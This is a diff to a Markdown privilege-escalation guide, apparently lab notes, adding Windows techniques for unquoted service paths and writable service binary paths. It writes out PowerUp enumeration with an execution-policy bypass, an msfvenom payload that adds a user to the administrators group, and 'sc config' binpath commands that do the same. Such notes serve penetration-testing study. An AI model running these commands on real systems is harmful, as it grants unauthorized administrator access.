@@ -70,6 +70,20 @@ Abuse of the research methodology of executable of windows. We will try to place
 - Enumerate with automatic tools or this command: `wmic service get name,displayname,pathname,startmode` (it will list the running services)
 - Check if we can write in the folder of the service 
 
+### Enumeration with powerUp
+
+- `powershell -ep bypass`
+- `. .\PowerUp.ps1`
+- `Invoke-AllChecks`  
+![image](https://user-images.githubusercontent.com/96747355/162632057-e45dc167-b88a-4e4d-a989-563eb810cda2.png)  
+
+### Exploitation
+
+- `msfvenom -p windows/exec CMD='net localgroup administrators user /add' -f exe-service -o common.exe`
+- We place the executable in the folder of the program we wish to abuse
+- We start the vulnerable service in our example unquotedsvc `sc start unquotedsvc`
+- we should be added as an administrator we can verify this using `net localgroup administrators`
+
 ## Runas
 
 ### What is it
@@ -218,6 +232,24 @@ Abuse of the research methodology of executable of windows. We will try to place
 - We put it in the path where the system will look for it, in our example it is the temp folder
 - We restart the service `sc stop dllsvc & sc start dllsvc`
 - Our user should be in the admin group now
+
+## Binary path
+
+### Enumeration
+
+- PowerUP we should see the service exploitable under the `[*] Checking service permissions`  
+
+**OR**
+
+- We can use [accesschk](https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk) `accesschk64.exe -wuvc Everyone *`
+  - Will list service we can write and to which everyone has access (in our example the service is daclsvc)
+![image](https://user-images.githubusercontent.com/96747355/162620616-800737e9-9762-4a0e-b06d-41ea822abd32.png)  
+
+### Exploitation
+
+- `sc config daclsvc binpath= "net localgroup administrators user /add"`
+- `sc start daclsvc`
+- We should be added to the administrators group `net localgroup administrators`
 
 ## Resources
 
